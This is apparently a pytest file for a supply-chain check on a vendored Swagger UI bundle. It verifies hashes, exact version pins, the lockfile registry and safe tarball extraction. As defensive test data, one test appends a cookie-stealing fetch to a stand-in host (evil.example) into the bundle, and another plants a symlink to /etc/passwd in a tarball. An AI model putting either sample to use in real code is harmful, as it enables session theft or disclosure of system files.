"""The vendored Swagger UI behind /docs/reference (threat model I6, E5): its files are exactly
the pinned release's, with its license, and an update Dependabot proposes fails here until the
files are vendored again with `scripts/vendor_docs_ui.py`."""

from __future__ import annotations

import importlib.util
import io
import json
import shutil
import subprocess
import sys
import tarfile
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "vendor_docs_ui.py"


def _script() -> Any:
    spec = importlib.util.spec_from_file_location("vendor_docs_ui", SCRIPT)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


vendor_docs_ui = _script()


@pytest.fixture
def copy(tmp_path: Path) -> Path:
    """The vendored package, copied: each test breaks it in its own way."""
    return Path(shutil.copytree(vendor_docs_ui.VENDOR, tmp_path / "swagger-ui"))


def _version(directory: Path) -> str:
    return str(json.loads((directory / "manifest.json").read_text())["version"])


def test_the_vendored_files_match_the_pin() -> None:
    result = subprocess.run(
        [sys.executable, str(SCRIPT), "--check"], capture_output=True, text=True, check=False
    )
    assert (result.returncode, result.stderr) == (0, "")
    pin = vendor_docs_ui.pinned()
    manifest = json.loads((vendor_docs_ui.VENDOR / "manifest.json").read_text())
    assert pin["tarball"].startswith("https://registry.npmjs.org/swagger-ui-dist/-/")
    assert manifest["integrity"] == pin["integrity"] and manifest["license"] == "Apache-2.0"


def test_the_license_and_notice_ship_with_the_code() -> None:
    files = vendor_docs_ui.VENDOR / _version(vendor_docs_ui.VENDOR)
    assert "Apache License" in (files / "LICENSE").read_text()
    assert "SmartBear" in (files / "NOTICE").read_text()  # Apache-2.0 section 4(d)
    bundle = (files / "swagger-ui-bundle.js").read_text()
    assert bundle.startswith("/*! For license information please see swagger-ui-bundle.js.LICENSE")
    assert (files / "swagger-ui-bundle.js.LICENSE.txt").stat().st_size > 0


def test_a_changed_file_fails_the_check(copy: Path) -> None:
    bundle = copy / _version(copy) / "swagger-ui-bundle.js"
    bundle.write_bytes(bundle.read_bytes() + b"\nfetch('https://evil.example/'+document.cookie)")
    assert vendor_docs_ui.check(copy) == [
        f"{_version(copy)}/swagger-ui-bundle.js does not match its sha256 in manifest.json"
    ]
    (copy / _version(copy) / "extra.js").write_text("")
    assert any("holds" in problem for problem in vendor_docs_ui.check(copy))


def test_an_update_fails_the_check_until_it_is_vendored(copy: Path) -> None:
    """What a Dependabot pull request changes: package.json and the lockfile, not the files."""
    package = json.loads((copy / "package.json").read_text())
    package["dependencies"]["swagger-ui-dist"] = "99.0.0"
    (copy / "package.json").write_text(json.dumps(package))
    lock = json.loads((copy / "package-lock.json").read_text())
    entry = lock["packages"]["node_modules/swagger-ui-dist"]
    entry["version"] = "99.0.0"
    entry["resolved"] = "https://registry.npmjs.org/swagger-ui-dist/-/swagger-ui-dist-99.0.0.tgz"
    entry["integrity"] = "sha512-bmV3"
    (copy / "package-lock.json").write_text(json.dumps(lock))
    problems = vendor_docs_ui.check(copy)
    assert len(problems) == 3 and all("run scripts/vendor_docs_ui.py" in p for p in problems)


@pytest.mark.parametrize("pin", ["^5.33.0", "5.x", "latest", "5.33.0-beta.1"])
def test_only_an_exact_release_may_be_pinned(copy: Path, pin: str) -> None:
    package = json.loads((copy / "package.json").read_text())
    package["dependencies"]["swagger-ui-dist"] = pin
    (copy / "package.json").write_text(json.dumps(package))
    assert vendor_docs_ui.check(copy) == [
        f"ValueError: package.json pins swagger-ui-dist {pin!r}, not an exact version"
    ]


def test_a_lockfile_out_of_step_or_off_the_registry_fails(copy: Path) -> None:
    lock = json.loads((copy / "package-lock.json").read_text())
    entry = lock["packages"]["node_modules/swagger-ui-dist"]
    entry["resolved"] = "https://registry.example.net/swagger-ui-dist.tgz"
    (copy / "package-lock.json").write_text(json.dumps(lock))
    assert "outside https://registry.npmjs.org/" in vendor_docs_ui.check(copy)[0]
    entry["version"] = "5.0.0"
    (copy / "package-lock.json").write_text(json.dumps(lock))
    assert "package-lock.json has 5.0.0" in vendor_docs_ui.check(copy)[0]


def test_an_old_version_left_behind_fails_the_check(copy: Path) -> None:
    shutil.copytree(copy / _version(copy), copy / "5.0.0")
    assert vendor_docs_ui.check(copy) == [
        f"version directories ['5.0.0', '{_version(copy)}'], expected ['{_version(copy)}']"
    ]


def test_the_tarball_gives_up_regular_files_only(tmp_path: Path) -> None:
    """A link in the tarball (to a file outside it, say) is never followed or copied."""
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for name in (*vendor_docs_ui.FILES, "package.json"):
            data = b"x"
            info = tarfile.TarInfo(f"package/{name}")
            if name == "LICENSE":
                info.type, info.linkname = tarfile.SYMTYPE, "/etc/passwd"
            else:
                info.size = len(data)
            archive.addfile(info, io.BytesIO(data) if info.isfile() else None)
    with pytest.raises(SystemExit, match="the tarball lacks \\['LICENSE'\\]"):
        vendor_docs_ui._extract(buffer.getvalue())
